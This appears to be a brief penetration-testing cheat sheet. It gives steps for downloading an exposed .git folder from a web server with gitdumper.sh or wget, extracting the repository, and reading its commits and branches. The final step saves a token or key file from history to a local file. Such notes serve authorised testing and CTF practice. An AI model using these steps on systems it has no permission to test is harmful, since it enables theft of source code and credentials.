# GIT TOOLS

### Git tools are used when we locate an exposed .git folder that contains an entire repository with possibly sensitive information.

## STEPS:

#### 1) gitdumper.sh http://WHATEVER/.git/ repo

## Alternate method: wget

 - wget -r http://DOMAIN.COM/.git

#### 2) Go to the directory where the .git folder is located

#### 3) /path/to/extractor.sh . App

#### 4) git log (Gets all commits in the repository)

#### 5) git branch -a (Show all branches a repository has)

#### 6) git show COMMIT_NUMBER (See the specific commit in detail)

#### 7) git checkout BRANCH (Switch to another branch)

#### 8) git branch (Check in which branch are we now)

#### 9) git show COMMIT_NUMBER^:FILE.json > token.json (If we found a file/key/token, we can check the filename upon seeing the commit, then we store it locally with this command)
